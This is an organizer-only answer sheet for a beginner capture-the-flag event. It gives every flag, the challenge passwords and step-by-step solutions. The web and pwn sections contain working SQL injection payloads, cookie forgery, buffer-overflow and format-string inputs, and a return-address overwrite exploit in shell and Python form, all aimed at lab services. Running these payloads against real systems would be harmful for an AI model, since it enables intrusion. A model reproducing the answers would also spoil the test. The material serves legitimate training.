# STARS CTF answer sheet

**Organizers only. Don't share this file or show it on screen during the event.**

CTFd checks flags automatically and they're case-sensitive, so this sheet is for checking challenges and helping players. The maximum score is 1860: 310 per category. Every hint costs points, so a team that used them can solve everything and still finish lower. CTFd won't sell a hint that costs more than a team's current score, so a team on 0 points has to solve something first.

Each team gets 3 wrong flags per challenge, shared by its members, and a typo counts. After the third, CTFd locks that challenge for the team. To unlock it, delete one of the team's wrong submissions for it in **Admin Panel > Submissions**, then wait a minute before they try again.

The commands use `192.168.68.104`. If your IP has changed, use the new one.

## Ursa Minor (Linux)

| Star | Difficulty | Points | Password | Flag |
|---|---|---|---|---|
| Pherkad | ★ Easy | 30 | `firststep` | `STARS{ph3rk4d_f1rst_st3p}` |
| Polaris | ★ Easy | 30 | `northstar` | `STARS{p0l4r1s_gu1d3s_th3_w4y}` |
| Yildun | ★ Easy | 30 | `littledipper` | `STARS{y1ldun_f0ll0w_th3_p4th}` |
| Kochab | ★★ Medium | 60 | `guardian` | `STARS{k0ch4b_gu4rd14n_0f_th3_p0l3}` |
| Urodelus | ★★ Medium | 60 | `dipperhandle` | `STARS{ur0d3lus_0n3_0f_4_k1nd}` |
| Akhfa | ★★★ Hard | 100 | `hiddenstar` | `STARS{4khf4_unwr4pp3d_4t_l4st}` |

Each star starts the same way: log in, then enter the password from the table when asked. Nothing shows on screen while you type it. Run `exit` before moving on to the next star.

Home folders are read-only, so anything that writes a file has to happen in `/tmp`.

### Pherkad

1. Log in: `ssh pherkad@192.168.68.104 -p 2220`
2. List the files with `ls`. You'll see `flag.txt`.
3. Read it with `cat flag.txt`. That's the flag.

### Polaris

1. Log in: `ssh polaris@192.168.68.104 -p 2220`
2. List the files with `ls`. You'll only see `README.txt`.
3. Read it with `cat README.txt`. It says some things don't show up unless you ask to see all of them.
4. List everything, including hidden files, with `ls -a`. Now `.north_star` appears.
5. Read it with `cat .north_star`. That's the flag.

### Yildun

1. Log in: `ssh yildun@192.168.68.104 -p 2220`
2. List the files with `ls`. You'll only see a folder called `sky`.
3. Locate the flag with `find ~ -name flag.txt`. It prints `/home/yildun/sky/northern/ursa-minor/yildun/flag.txt`.
4. Go to that folder with `cd ~/sky/northern/ursa-minor/yildun`.
5. Read it with `cat flag.txt`. That's the flag.

To teach `cd` and `ls` instead of `find`, walk down one folder at a time: `sky`, `northern`, `ursa-minor`, `yildun`. The `notes.txt` files in the other folders are dead ends.

### Kochab

The challenge says the real record is exactly 1337 bytes and owned by `astronomer`.

1. Log in: `ssh kochab@192.168.68.104 -p 2220`
2. Count the records with `ls catalog | wc -l`. There are 600.
3. See why a plain search fails with `grep -h flag: catalog/* | head -3`. Every record has something that looks like a flag.
4. Filter by size with `find ~/catalog -type f -size 1337c`, where `c` means bytes. That still leaves 25 files.
5. Add the owner with `find ~/catalog -type f -size 1337c -user astronomer`. Now one file is left: `/home/kochab/catalog/HD156444.rec`.
6. Pull out the flag line with `grep flag: ~/catalog/HD156444.rec`. That's the flag.

Steps 5 and 6 as one command: `grep flag: "$(find ~/catalog -type f -size 1337c -user astronomer)"`

### Urodelus

The challenge says every reading was logged at least twice, except the real flag.

1. Log in: `ssh urodelus@192.168.68.104 -p 2220`
2. Look at the format with `head -3 sky.log`. Each line is a time, a sensor and a reading.
3. See why whole lines can't be compared with `sort sky.log | uniq -u | wc -l`. It prints `4495`, the same as the number of lines in the log, because the time and sensor make every line different.
4. Keep only the reading with `cut -d' ' -f3 sky.log | head -3`. `awk '{print $3}' sky.log` works in place of `cut`.
5. Find the reading that appears once with `cut -d' ' -f3 sky.log | sort | uniq -u`. That's the flag. `sort` has to come first because `uniq` only compares neighboring lines.

### Akhfa

The layers are Base64, gzip, tar and gzip. Before each unwrap, run `file` to see what the current layer is.

1. Log in: `ssh akhfa@192.168.68.104 -p 2220`
2. Make a private folder and go into it with `cd "$(mktemp -d)"`. Every team shares this login, so a fixed name like `/tmp/akhfa` could collide with theirs.
3. Copy the file in with `cp ~/signal.dat .`
4. Undo the Base64:
   ```bash
   file signal.dat                # ASCII text
   base64 -d signal.dat > layer1
   ```
5. Undo the first gzip:
   ```bash
   file layer1                    # gzip compressed data, ... original size modulo 2^32 10240
   gunzip -c layer1 > layer2
   ```
6. Undo the tar. It writes its own file, so check `ls` for the new name:
   ```bash
   file layer2                    # POSIX tar archive (GNU)
   tar -xf layer2
   ls                             # transmission.gz has appeared
   ```
7. Undo the last gzip, which prints the flag:
   ```bash
   file transmission.gz           # gzip compressed data
   gunzip -c transmission.gz
   ```

All of it as one command: `base64 -d ~/signal.dat | gunzip | tar -xO | gunzip`

#### Which command unwraps which layer

| `file` says | Command to unwrap it |
|---|---|
| `ASCII text` (random letters, numbers, `+` `/`, often ends in `=`) | `base64 -d IN > OUT` |
| `gzip compressed data` | `gunzip -c IN > OUT` |
| `POSIX tar archive` | `tar -xf IN` then `ls` (the output keeps its own name) |

#### Clues

- Base64 starting with `H4sI` is gzip underneath
- A file name ending in `.gz` or `.tar` tells you the next layer
- A gzip "original size" of 10240 usually means a tar inside

#### Mistakes to avoid

- Always run `file` on the **newest** layer, not the original
- `gzip` compresses; `gunzip` decompresses
- `tar` doesn't write to `OUT`; check `ls` for the extracted file
- Don't `cat` binary files; run `file` first


## Orion (Web)

| Star | Difficulty | Points | Address | Flag |
|---|---|---|---|---|
| Betelgeuse | ★ Easy | 30 | `:8082` | `STARS{b3t3lg3us3_v13w_s0urc3}` |
| Bellatrix | ★ Easy | 30 | `:8083` | `STARS{b3ll4tr1x_r0b0ts_kn0w}` |
| Mintaka | ★ Easy | 30 | `:8084` | `STARS{m1nt4k4_n3v3r_trust_th3_br0ws3r}` |
| Rigel | ★★ Medium | 60 | `:8081` | `STARS{r1g3l_bl1nds_th3_0bs3rv4t0ry}` |
| Alnilam | ★★ Medium | 60 | `:8085` | `STARS{4ln1l4m_c00k13s_c4n_l13}` |
| Alnitak | ★★★ Hard | 100 | `:8086` | `STARS{4ln1t4k_un10n_s3l3ct_w1ns}` |

Open each address in a browser. The `:8082` means `http://192.168.68.104:8082`.

### Betelgeuse

1. Open `http://192.168.68.104:8082`.
2. Right-click the page and choose **View page source** (or press Ctrl+U).
3. Read down to the staff note in an HTML comment (a line starting `<!--`). The flag is the archive key inside it.

### Bellatrix

1. Open `http://192.168.68.104:8083`.
2. Add `/robots.txt` to the address: `http://192.168.68.104:8083/robots.txt`. It lists one disallowed page, `/captains-log/`.
3. Open that page: `http://192.168.68.104:8083/captains-log/`. The flag is on it.

### Mintaka

1. Open `http://192.168.68.104:8084`.
2. Right-click and choose **View page source**. The check runs in the browser, so the code is in the page.
3. Read the `<script>` section. It compares your input against the access code `orions-belt-1`.
4. Type `orions-belt-1` into the access code box and submit. The vault opens and shows the flag.

### Rigel

The login builds its database query by pasting your text straight in, so your input can change what the query means. The key only shows for the director, whose clearance is 9.

1. Open `http://192.168.68.104:8081`.
2. In the **username** box, enter `director' -- ` (with a trailing space after `--`). Put anything in the password box.
3. Submit. You're signed in as the director, and the dashboard shows the telescope key.

Notes: the `-- ` comments out the rest of the query, including the password check. `' OR clearance=9 -- ` works too. Plain `' OR 1=1 -- ` logs you in as `observer`, who has clearance 1 and can't see the key, so it's a useful "close but wrong" to show players.

### Alnilam

The site decides your role from a cookie it set, and you can edit your own cookies.

1. Open `http://192.168.68.104:8085`. It shows you signed in as `visitor`.
2. Press F12 to open developer tools. Under **Application** (Chrome/Edge) or **Storage** (Firefox), find Cookies and the cookie named `pass`.
3. Its value is Base64 of `role=visitor`. Replace the whole value with `cm9sZT1hc3Ryb25vbWVy`, which is Base64 of `role=astronomer`.
4. Refresh the page. The dome opens and shows the flag.

### Alnitak

Same injection as Rigel, but there's no login to bypass. The flag is in another table whose name you have to discover first. The search shows 3 columns, so each injected query returns 3 values.

1. Open `http://192.168.68.104:8086`.
2. In the search box, enter the first query to list the tables and their definitions (trailing space after `--`):
   ```text
   ' UNION SELECT name, sql, 0 FROM sqlite_master --
   ```
   The results reveal a table named `dome_vault_7f3a` with columns `key_name` and `key_value`.
3. Enter the second query to read that table:
   ```text
   ' UNION SELECT key_name, key_value, 0 FROM dome_vault_7f3a --
   ```
   The flag appears in the results as the `key_value`.

## Gemini (Crypto)

| Star | Difficulty | Points | Flag |
|---|---|---|---|
| Pollux | ★ Easy | 30 | `STARS{p0llux_sp34ks_b4s3_64}` |
| Alhena | ★ Easy | 30 | `STARS{4lh3n4_t4lks_1n_h3x}` |
| Castor | ★ Easy | 30 | `STARS{c4st0r_4nd_p0llux_tw1n_s1gn4ls}` |
| Wasat | ★★ Medium | 60 | `STARS{w4s4t_k3pt_th3_k3y}` |
| Mebsuta | ★★ Medium | 60 | `STARS{m3bsut4_r3p34t1ng_x0r}` |
| Tejat | ★★★ Hard | 100 | `STARS{t3j4t_tw1ns_sh4r3d_4_pr1m3}` |

Each one is solved from the file CTFd gives the player to download. The first five use [CyberChef](https://gchq.github.io/CyberChef/): paste the file's contents into the **Input** box (top right), drag operations into the **Recipe** column (middle), and read the answer in **Output** (bottom right). The flag is the `STARS{...}` part of the decoded text. I checked all six against the real files.

### Pollux

1. Open the downloaded `message.txt` and copy its contents into CyberChef's Input.
2. Drag **From Base64** into the Recipe.
3. The Output reads `POLLUX RELAY, CHANNEL ONE. FLAG FOLLOWS: STARS{...}`.

### Alhena

1. Copy the contents of `message.txt` into the Input.
2. Drag **From Hex** into the Recipe.
3. The Output reads `ALHENA RELAY. FLAG FOLLOWS: STARS{...}`.

### Castor

Two layers: Base64 on the outside, a Caesar shift of 7 on the inside. The description names both and steers players to CyberChef's ROT13 operations.

1. Copy `transmission.txt` into the Input.
2. Drag **From Base64** into the Recipe. The Output is still scrambled letters.
3. Drag **ROT13 Brute Force** below it and type `STARS` in its **Crib** box.
4. One line is left: `Amount = 19: GEMINI RELAY, CHANNEL TWO. FLAG FOLLOWS: STARS{...}`. (Shifting back 7 is the same as shifting forward 19.)

Plain **ROT13** with **Amount** `19` gives the same text without the `Amount = 19:` prefix. ROT13 Brute Force only shows the first 100 characters at each shift, which is why `make_files.py` keeps Castor's message shorter than that.

### Wasat

A Vigenère cipher with the keyword `TWINS`. The description gives it as a riddle: five letters, what Castor and Pollux are to each other.

1. Copy `message.txt` into the Input.
2. Drag in **Vigenère Decode** and set the key to `TWINS` (capitals don't matter here).
3. The Output reads `THE MIDDLE OF THE TWINS... FLAG FOLLOWS: STARS{...}`.

The first hint teaches the other way in, for teams that can't guess the riddle: the five letters just before the `{` are the encrypted `STARS`, so putting only those five through **Vigenère Decode** with key `STARS` outputs `TWINS`. The second hint just gives the keyword.

### Mebsuta

Hex on the outside, a repeating-key XOR underneath, with the key `LEDA`. The description gives it as a clue: four capital letters, the Gemini twins' mother in Greek myth (Leda). A search for "Gemini twins mother" finds her.

1. Copy `message.txt` into the Input and drag in **From Hex**.
2. Drag in **XOR** below it, switch the key's format from Hex to **UTF8**, and type `LEDA`.
3. The Output reads `STARS{...} END OF MEBSUTA RELAY.`

The key must be in capitals: XOR treats `L` and `l` as different bytes, so `Leda` gives gibberish. Leaving the format on Hex is the other likely mistake, and the description warns about both.

The first hint teaches the other way in: the message opens with the flag, so XOR with `STARS{` (UTF8) makes the first six characters read `LEDALE`, the key starting to repeat. The second hint gives the key and the recipe.

### Tejat

RSA where two public keys share a prime, which breaks both. No coding needed: it's two free websites, [Alpertron's calculator](https://www.alpertron.com.ar/ECM.HTM) for the big-number maths and [dcode's RSA Cipher tool](https://www.dcode.fr/rsa-cipher) to decrypt. CyberChef won't do this one. The file gives `n_prior`, `n_tejat`, `e` and `c`. Each `n` is 617 digits, so copy and paste the numbers rather than typing them.

1. Find the shared prime. On Alpertron's calculator, enter `Gcd(n_prior, n_tejat)`, pasting the two numbers in place of the names, and press **Only evaluate**. The result is `p`, a 309-digit prime starting `148935344472`.
2. Find Tejat's other prime. Enter `n_tejat / p`, again pasting the numbers, and press **Only evaluate**. The result is `q`, starting `160732278597`. (Alpertron's `/` is whole-number division, and it divides exactly here.)
3. Decrypt. On dcode's RSA Cipher tool, fill in **C** with `c`, **E** with `65537`, **N** with `n_tejat`, **P** with `p` and **Q** with `q`. Leave the other boxes empty, choose to display the plaintext as a **character string**, and run it.
4. It shows `TEJAT RELAY. FLAG FOLLOWS: STARS{...}`.

If dcode asks for `D` instead, get it from Alpertron with `Modinv(65537, (p - 1) * (q - 1))` and fill in **C**, **N** and **D**. Alpertron can also do the whole decryption with `Modpow(c, D, n_tejat)`, but that gives the message as one big number, which still needs a converter to turn it into text.

If you have Python, this does the whole thing at once, which is handy for checking:

```python
import math, re
v = dict(re.findall(r"(\w+)\s*=\s*(\d+)", open("transmission.txt").read()))
n_prior, n_tejat, e, c = (int(v[k]) for k in ("n_prior", "n_tejat", "e", "c"))
p = math.gcd(n_prior, n_tejat)      # the shared prime
q = n_tejat // p
m = pow(c, pow(e, -1, (p - 1) * (q - 1)), n_tejat)
print(bytes.fromhex(hex(m)[2:]).decode())
```

## Lyra (Forensics)

| Star | Difficulty | Points | Flag |
|---|---|---|---|
| Sheliak | ★ Easy | 30 | `STARS{sh3l14k_m3t4d4t4_sp34ks}` |
| Sulafat | ★ Easy | 30 | `STARS{SULAFAT_WRONG_EXTENSION}` |
| Aladfar | ★ Easy | 30 | `STARS{4l4df4r_wh1t3_1nk}` |
| Vega | ★★ Medium | 60 | `STARS{v3g4_h1d3s_1n_th3_d33p_f13ld}` |
| Alathfar | ★★ Medium | 60 | `STARS{4l4thf4r_sn1ff3d_th3_w1r3}` |
| Double Double | ★★★ Hard | 100 | `STARS{d0ubl3_d0ubl3_b1ts_1n_th3_r3d}` |

Each one starts from the file CTFd gives the player to download. I checked all six against the real files.

### Sheliak

The flag is in the PNG's metadata, not the picture.

1. Open the downloaded `sheliak.png` in a plain text editor (Notepad works). It looks like gibberish.
2. Press Ctrl+F and search for `STARS`.
3. It lands on an observer note: `Observer note. Archive key: STARS{...}`. That's the flag.

### Sulafat

The file is named `notes.txt` but it's really a PNG; the extension is wrong.

1. Open `notes.txt` in a text editor and look at the very first characters. They read `‰PNG` — the signature of a PNG image.
2. Rename the file to `notes.png`. (If Windows hides extensions, turn them on in File Explorer's **View** menu first.)
3. Open `notes.png` in any image viewer. It's a picture of the flag; read it off the image.

### Aladfar

White text on a white page — invisible until you select it.

1. Open `aladfar_report.pdf` in your browser.
2. Press Ctrl+A to select everything on the page. A highlighted line appears in the gap in the middle: `Archive key: STARS{...}`.
3. Alternatively, run `pdftotext aladfar_report.pdf -` and read the flag from the output.

### Vega

The file is bigger than such a dark image should be, because a zip archive is tacked on after the end of the PNG.

1. Confirm there's extra data: `binwalk vega_deep_field.png` lists a Zip archive partway through the file. (A hex viewer scrolled to the end shows the same.)
2. Pull the hidden file out: `unzip -p vega_deep_field.png observation_log.txt`. It warns about extra bytes before the zip — that's expected, and it still extracts.
3. The log's `ARCHIVE KEY` line is the flag.

### Alathfar

A packet capture of someone logging in over plain HTTP. The password travels in the clear as Base64.

1. Open `alathfar_capture.pcap` in [Wireshark](https://www.wireshark.org/).
2. Type `http` in the filter bar and press Enter. You'll see two `POST /login` requests — the first attempt failed, the second succeeded.
3. Click the **second** `POST /login`, expand the HTTP section, and find the `Authorization: Basic ...` line. Wireshark shows the decoded `astronomer:STARS{...}`; the part after the colon is the flag.
4. Command-line alternative: `tshark -r alathfar_capture.pcap -Y http.request -T fields -e http.authbasic` prints both logins; the flag is the password on the second.

### Double Double

Steganography: the flag is hidden one bit at a time in the red channel. This is a programming solve — use Python with Pillow, or an online tool like Aperi'Solve.

1. Read the lowest bit of each pixel's **red** value, going left to right, top to bottom.
2. Group the bits into 8s; each group is one character, highest bit first. Stop at the first all-zero byte.
3. With Pillow:
   ```python
   from PIL import Image
   px = Image.open("double_double.png").convert("RGB").load()
   w, h = Image.open("double_double.png").size
   bits = [px[x, y][0] & 1 for y in range(h) for x in range(w)]
   out = bytearray()
   for i in range(0, len(bits), 8):
       b = 0
       for bit in bits[i:i+8]:
           b = (b << 1) | bit
       if b == 0:
           break
       out.append(b)
   print(out.decode())
   ```
4. It prints the flag, `STARS{d0ubl3_...}`.

## Scorpius (Pwn)

| Star | Difficulty | Points | Flag |
|---|---|---|---|
| Shaula | ★ Easy | 30 | `STARS{sh4ul4_h1dd3n_m3nu}` |
| Sargas | ★ Easy | 30 | `STARS{s4rg4s_n3g4t1v3_cr3d1ts}` |
| Lesath | ★ Easy | 30 | `STARS{l3s4th_0v3rfl0w3d_th3_b4dg3}` |
| Dschubba | ★★ Medium | 60 | `STARS{dschubb4_3x4ct_0ff53t}` |
| Acrab | ★★ Medium | 60 | `STARS{4cr4b_f0rm4t_str1ng_l34k}` |
| Antares | ★★★ Hard | 100 | `STARS{4nt4r3s_w3nt_sup3rn0v4}` |

For Shaula through Acrab, connect with `ssh <star>@192.168.68.104 -p 2220` and the password `scorpius`; the login drops straight into the program. On a computer that has `nc`, you can instead connect to the matching port: Shaula 9002, Sargas 9003, Lesath 9004, Dschubba 9005, Acrab 9006. Antares needs raw bytes and is handled separately below. I ran all six against the live services and each returned its flag.

### Shaula

The menu shows three options, but the source has a hidden fourth case.

1. Connect: `ssh shaula@192.168.68.104 -p 2220`, password `scorpius`.
2. At the `>` prompt, type `42` and press Enter.
3. It prints the flag.

### Sargas

The flag costs 1000 credits and you have 100. The shop checks you can afford a purchase but doesn't stop you buying a negative quantity, which refunds credits.

1. Connect: `ssh sargas@192.168.68.104 -p 2220`, password `scorpius`.
2. Choose `1` (buy maps). When asked how many, enter `-100`. That costs `-1000`, so your credits rise from 100 to 1100.
3. Choose `2` (buy the flag). You can now afford it, and it prints the flag.

### Lesath

The name tag holds 16 characters, and the "are you an astronomer" flag sits right after it in memory. A long enough name overflows into it.

1. Connect: `ssh lesath@192.168.68.104 -p 2220`, password `scorpius`.
2. When asked for your name, type 17 or more characters (e.g. `AAAAAAAAAAAAAAAAA`) and press Enter.
3. The overflow sets the astronomer value to non-zero, and the program prints the flag.

### Dschubba

Same idea as Lesath, but the overflow has to land one exact 4-byte value in `key`. From the struct, `name` is 32 bytes and `visits` is 4, so `key` begins 36 bytes in. It must equal `0x41564f4e`, which in little-endian byte order is the text `NOVA`.

1. Connect: `ssh dschubba@192.168.68.104 -p 2220`, password `scorpius`.
2. When asked for your name, enter exactly 36 characters followed by `NOVA`:
   ```text
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANOVA
   ```
3. The program echoes `Key on file: 0x41564f4e` and prints the flag. (If it shows a different hex value, your filler wasn't exactly 36 characters.)

### Acrab

The program passes your input straight to `printf`, so format codes like `%s` read from memory. The flag is on the stack, at argument position 31.

1. Connect: `ssh acrab@192.168.68.104 -p 2220`, password `scorpius`.
2. At the `Callsign:` prompt, enter `%31$s` and press Enter.
3. It prints the flag on the `Transmitting:` line.

To find the position from scratch (if the binary is recompiled), try `%p %p %p %p` first to confirm the bug, then step `%6$s`, `%7$s`, … upward. A crash just means that slot wasn't a text pointer; reconnect and keep going. I confirmed 31 is the one that works right now.

### Antares

A classic return-address overwrite. The buffer is 64 bytes with 8 more bytes of saved data before the return address (72 bytes total), and the program prints the address of the `supernova()` function, which reads the flag. This needs raw bytes, so pipe them in rather than typing.

The address is currently `0x4017c5`. **Read it live each time** from the program's `supernova() is at 0x...` line — it changes if `antares.c` is recompiled.

- **From the SSH box** (log in to any Ursa Minor account, which has `nc`), with the current address:
  ```bash
  printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc5\x17\x40\x00\x00\x00\x00\x00' | nc antares 9001
  ```
  That's 72 `A`s, then the 8-byte address written backwards (little-endian). It prints `*** CORE COLLAPSE ***` and the flag.

- **From your own computer with Python** (reads the address automatically, so it survives a rebuild):
  ```python
  import socket, re, struct
  s = socket.create_connection(("192.168.68.104", 9001))
  banner = s.recv(4096).decode(errors="replace")
  addr = int(re.search(r"supernova\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)
  s.sendall(b"A" * 72 + struct.pack("<Q", addr))
  print(s.recv(4096).decode(errors="replace"))
  ```

## Draco (Reversing)

| Star | Difficulty | Points | Flag |
|---|---|---|---|
| Thuban | ★ Easy | 30 | `STARS{thub4n_th3_0ld_p0l3_st4r}` |
| Eltanin | ★ Easy | 30 | `STARS{3lt4n1n_w4tch3s_th3_c4lls}` |
| Rastaban | ★ Easy | 30 | `STARS{r4st4b4n_r34d_th3_c0d3}` |
| Altais | ★★ Medium | 60 | `STARS{4lt41s_c4ught_1n_m3m0ry}` |
| Edasich | ★★ Medium | 60 | `STARS{3d4s1ch_und0n3_1n_r3v3rs3}` |
| Aldhibah | ★★★ Hard | 100 | `STARS{4ldh1b4h_w0k3_th3_dr4g0n}` |

Every Draco star is on its own SSH box: `ssh <star>@192.168.68.104 -p 2222`, password `draco` for all six. Each account's home folder holds just that star's program, and the box already has `strings`, `ltrace`, `gdb` and `python3`, so players install nothing. The flags are scrambled inside the programs (except Thuban's), so `strings` only works on Thuban. I solved all six over SSH on the live box.

gdb prints a warning that it can't find the `.c` file. That's expected, because players get the program without its source, and the Altais and Aldhibah descriptions say so.

### Thuban

The "start here" level, with the steps in the description. The flag is stored in the program as plain text, but the program never prints it.

1. Log in: `ssh thuban@192.168.68.104 -p 2222`, password `draco`.
2. Run `strings thuban | grep STARS`.
3. It prints the flag.

### Eltanin

The program takes a guess after its name and compares it with the real password using `strcmp`. The real password is stored scrambled, so `strings` doesn't show it, but `ltrace` shows every library call along with its arguments.

1. Log in: `ssh eltanin@192.168.68.104 -p 2222`, password `draco`.
2. Run `ltrace ./eltanin hello`.
3. The first line reads `strcmp("hello", "eye-of-the-dragon")`. The second text is the password.
4. Run `./eltanin eye-of-the-dragon`. It prints `The dragon blinks. STARS{...}`.

The guess comes after the program's name, not at a prompt, on purpose: with a prompt, ltrace's output gets tangled up with the program's and players can't tell it's waiting for them.

### Rastaban

A Python program that keeps its password backwards.

1. Log in: `ssh rastaban@192.168.68.104 -p 2222`, password `draco`.
2. `cat rastaban.py` shows `SECRET = "nogardehtfodaeh"` and the check `if guess == SECRET[::-1]:`. `[::-1]` reverses text, so the password is `headofthedragon`. The description suggests trying `"hello"[::-1]` in `python3` to see that, and `echo nogardehtfodaeh | rev` reverses the secret without typos.
3. Run `python3 rastaban.py` and type `headofthedragon`. It prints `Rastaban nods. STARS{...}`.

The flag in the file is XORed with the password, so it can't be read without solving the level.

### Altais

The program rebuilds the flag in memory, then wipes it without printing it. gdb can pause the program just before the wipe.

1. Log in: `ssh altais@192.168.68.104 -p 2222`, password `draco`.
2. Run `gdb ./altais`. `info functions` lists `remember_flag`, `forget_flag` and `main` at the top.
3. Type `break forget_flag`, then `run`.
4. gdb pauses with `Breakpoint 1, forget_flag (flag=0x7ffe... "STARS{...}")`, so the flag is already on screen. `info args` or `print flag` shows it again.
5. `quit` (answer `y`) leaves gdb.

### Edasich

A Python program that scrambles the password three ways (reverse it, move each letter 3 along the alphabet, Base64 encode it) and compares the result with the stored `SCRAMBLED = "cXJqZHVnaGt3aXJ2b2xyZg=="`. Undo the steps in the opposite order.

1. Log in: `ssh edasich@192.168.68.104 -p 2222`, password `draco`.
2. `cat edasich.py` and copy the `SCRAMBLED` value.
3. In CyberChef: **From Base64** (gives `qrjdughkwirvolrf`), then **ROT13** with **Amount** `23` (gives `nogardehtfoslioc`), then **Reverse** (gives `coilsofthedragon`).
4. Run `python3 edasich.py` and type `coilsofthedragon`. It prints `Edasich lets you pass. STARS{...}`.

The program only accepts letters, and lowercases what you type.

### Aldhibah

The program sleeps for a thousand years in `wait_for_dragon()`, then `is_rider()` checks you're root. gdb can make each function return early, and choose what `is_rider()` returns.

1. Log in: `ssh aldhibah@192.168.68.104 -p 2222`, password `draco`.
2. Run `gdb ./aldhibah`.
3. Type `break wait_for_dragon`, `break is_rider`, then `run`.
4. At the first pause, type `return`, answer `y`, then `continue`.
5. At the second pause, type `return 1`, answer `y`, then `continue`.
6. It prints `The dragon speaks: STARS{...}`.

Running `./aldhibah` without gdb just sleeps. Ctrl+C stops it.
